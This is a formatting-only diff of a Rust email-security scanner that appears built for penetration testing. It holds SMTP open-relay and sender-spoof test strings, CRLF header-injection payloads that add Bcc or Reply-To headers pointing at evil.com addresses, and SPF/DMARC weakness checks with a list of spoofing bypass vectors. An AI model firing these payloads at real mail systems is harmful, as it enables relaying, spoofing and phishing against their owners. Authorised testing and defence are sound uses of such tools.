@@ -3,7 +3,11 @@ use reqwest::Client;
 use std::time::Duration;
 
 fn build_client(timeout: u64) -> Client {
-    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
+    Client::builder()
+        .timeout(Duration::from_secs(timeout))
+        .redirect(reqwest::redirect::Policy::none())
+        .build()
+        .unwrap_or_else(|_| Client::new())
 }
 
 pub async fn relay(url: &str, timeout: u64) -> anyhow::Result<()> {
@@ -14,12 +18,27 @@ pub async fn relay(url: &str, timeout: u64) -> anyhow::Result<()> {
 
     let client = build_client(timeout);
     let test_cases = [
-        ("Direct relay", "MAIL FROM:<test@external.com> RCPT TO:<test@another.com>"),
-        ("IP spoof", "MAIL FROM:<test@localhost> RCPT TO:<test@external.com>"),
-        ("Domain spoof", "MAIL FROM:<test@target.local> RCPT TO:<test@external.com>"),
+        (
+            "Direct relay",
+            "MAIL FROM:<test@external.com> RCPT TO:<test@another.com>",
+        ),
+        (
+            "IP spoof",
+            "MAIL FROM:<test@localhost> RCPT TO:<test@external.com>",
+        ),
+        (
+            "Domain spoof",
+            "MAIL FROM:<test@target.local> RCPT TO:<test@external.com>",
+        ),
         ("Null sender", "MAIL FROM:<> RCPT TO:<test@external.com>"),
-        ("Percent hack", "MAIL FROM:<test%external.com@target> RCPT TO:<test@external.com>"),
-        ("Bang path", "MAIL FROM:<test!external.com@target> RCPT TO:<test@external.com>"),
+        (
+            "Percent hack",
+            "MAIL FROM:<test%external.com@target> RCPT TO:<test@external.com>",
+        ),
+        (
+            "Bang path",
+            "MAIL FROM:<test!external.com@target> RCPT TO:<test@external.com>",
+        ),
     ];
 
     for (name, smtp_cmd) in &test_cases {
@@ -28,8 +47,15 @@ pub async fn relay(url: &str, timeout: u64) -> anyhow::Result<()> {
             Ok(resp) => {
                 let status = resp.status().as_u16();
                 let text = resp.text().await.unwrap_or_default();
-                let relayed = text.contains("250") || text.contains("queued") || text.contains("accepted") || (status == 200 && !text.contains("relaying denied"));
-                let tag = if relayed { "OPEN RELAY".red().bold().to_string() } else { "relaying denied".to_string() };
+                let relayed = text.contains("250")
+                    || text.contains("queued")
+                    || text.contains("accepted")
+                    || (status == 200 && !text.contains("relaying denied"));
+                let tag = if relayed {
+                    "OPEN RELAY".red().bold().to_string()
+                } else {
+                    "relaying denied".to_string()
+                };
                 println!("  {} {:20} {}", "*".cyan(), name, tag);
             }
             Err(_) => println!("  {} {:20} error", "[-]".dimmed(), name),
@@ -51,8 +77,14 @@ pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
         ("Subject CRLF", "Hello\r\nBcc: victim@evil.com"),
         ("To CRLF", "user@target.com\r\nBcc: victim@evil.com"),
         ("From LF", "test@example.com\nBcc: victim@evil.com"),
-        ("Reply-To inject", "test@example.com\r\nReply-To: attacker@evil.com"),
-        ("Double CRLF body", "test@example.com\r\n\r\nInjected body content"),
+        (
+            "Reply-To inject",
+            "test@example.com\r\nReply-To: attacker@evil.com",
+        ),
+        (
+            "Double CRLF body",
+            "test@example.com\r\n\r\nInjected body content",
+        ),
     ];
 
     for (name, payload) in &payloads {
@@ -61,8 +93,13 @@ pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
             Ok(resp) => {
                 let status = resp.status().as_u16();
                 let text = resp.text().await.unwrap_or_default();
-                let injected = text.contains("queued") || text.contains("accepted") || status == 200;
-                let tag = if injected { "INJECTION ACCEPTED".red().bold().to_string() } else { format!("status={}", status) };
+                let injected =
+                    text.contains("queued") || text.contains("accepted") || status == 200;
+                let tag = if injected {
+                    "INJECTION ACCEPTED".red().bold().to_string()
+                } else {
+                    format!("status={}", status)
+                };
                 println!("  {} {:20} {}", "*".cyan(), name, tag);
             }
             Err(_) => println!("  {} {:20} error", "[-]".dimmed(), name),
@@ -79,12 +116,24 @@ pub async fn spf(url: &str, timeout: u64) -> anyhow::Result<()> {
     println!("{}", "-".repeat(60).dimmed());
 
     let client = build_client(timeout);
-    let domain = url.trim_start_matches("https://").trim_start_matches("http://").trim_end_matches('/');
+    let domain = url
+        .trim_start_matches("https://")
+        .trim_start_matches("http://")
+        .trim_end_matches('/');
 
     let checks = [
-        ("SPF record", serde_json::json!({"action": "dns_query", "domain": domain, "type": "TXT"})),
-        ("DMARC record", serde_json::json!({"action": "dns_query", "domain": format!("_dmarc.{}", domain), "type": "TXT"})),
-        ("DKIM selectors", serde_json::json!({"action": "dns_query", "domain": format!("default._domainkey.{}", domain), "type": "TXT"})),
+        (
+            "SPF record",
+            serde_json::json!({"action": "dns_query", "domain": domain, "type": "TXT"}),
+        ),
+        (
+            "DMARC record",
+            serde_json::json!({"action": "dns_query", "domain": format!("_dmarc.{}", domain), "type": "TXT"}),
+        ),
+        (
+            "DKIM selectors",
+            serde_json::json!({"action": "dns_query", "domain": format!("default._domainkey.{}", domain), "type": "TXT"}),
+        ),
     ];
 
     for (name, body) in &checks {
@@ -92,14 +141,33 @@ pub async fn spf(url: &str, timeout: u64) -> anyhow::Result<()> {
             Ok(resp) => {
                 let text = resp.text().await.unwrap_or_default();
                 if text.contains("v=spf1") {
-                    println!("  {} {} — SPF found: {}", "[+]".green().bold(), name, text.chars().take(60).collect::<String>());
-                    if text.contains("v=spf1 *") || text.contains("v=spf1 ?all") || text.contains("v=spf1 +all") {
-                        println!("    {} Weak SPF policy — spoofing possible!", "[!]".red().bold());
+                    println!(
+                        "  {} {} — SPF found: {}",
+                        "[+]".green().bold(),
+                        name,
+                        text.chars().take(60).collect::<String>()
+                    );
+                    if text.contains("v=spf1 *")
+                        || text.contains("v=spf1 ?all")
+                        || text.contains("v=spf1 +all")
+                    {
+                        println!(
+                            "    {} Weak SPF policy — spoofing possible!",
+                            "[!]".red().bold()
+                        );
                     }
                 } else if text.contains("v=DMARC1") {
-                    println!("  {} {} — DMARC found: {}", "[+]".green().bold(), name, text.chars().take(60).collect::<String>());
+                    println!(
+                        "  {} {} — DMARC found: {}",
+                        "[+]".green().bold(),
+                        name,
+                        text.chars().take(60).collect::<String>()
+                    );
                     if text.contains("p=none") {
-                        println!("    {} DMARC policy=none — no enforcement!", "[!]".red().bold());
+                        println!(
+                            "    {} DMARC policy=none — no enforcement!",
+                            "[!]".red().bold()
+                        );
                     }
                 } else if text.contains("DKIM") || text.contains("v=DKIM1") {
                     println!("  {} {} — DKIM record found", "[+]".green().bold(), name);
@@ -112,10 +180,19 @@ pub async fn spf(url: &str, timeout: u64) -> anyhow::Result<()> {
     }
 
     let bypass_vectors = [
-        ("Return-Path spoof", "Set Return-Path to pass SPF while From is spoofed"),
+        (
+            "Return-Path spoof",
+            "Set Return-Path to pass SPF while From is spoofed",
+        ),
         ("Mail-From mismatch", "Different MAIL FROM and From header"),
-        ("DKIM replay", "Replay valid DKIM-signed email to different recipients"),
-        ("Subdomain spoof", "Spoof from non-existent subdomain without DMARC"),
+        (
+            "DKIM replay",
+            "Replay valid DKIM-signed email to different recipients",
+        ),
+        (
+            "Subdomain spoof",
+            "Spoof from non-existent subdomain without DMARC",
+        ),
     ];
 
     println!("\n  {} Bypass vectors:", "[*]".cyan().bold());
@@ -151,8 +228,18 @@ pub async fn command(url: &str, timeout: u64) -> anyhow::Result<()> {
             Ok(resp) => {
                 let status = resp.status().as_u16();
                 let text = resp.text().await.unwrap_or_default();
-                let interesting = text.contains("250") || text.contains("252") || text.contains("200") || text.contains("user");
-                let tag = if interesting { format!("RESPONSE: {}", text.chars().take(40).collect::<String>()).yellow().bold().to_string() } else { format!("status={}", status) };
+                let interesting = text.contains("250")
+                    || text.contains("252")
+                    || text.contains("200")
+                    || text.contains("user");
+                let tag = if interesting {
+                    format!("RESPONSE: {}", text.chars().take(40).collect::<String>())
+                        .yellow()
+                        .bold()
+                        .to_string()
+                } else {
+                    format!("status={}", status)
+                };
                 println!("  {} {:20} {}", "*".cyan(), name, tag);
             }
             Err(_) => println!("  {} {:20} error", "[-]".dimmed(), name),
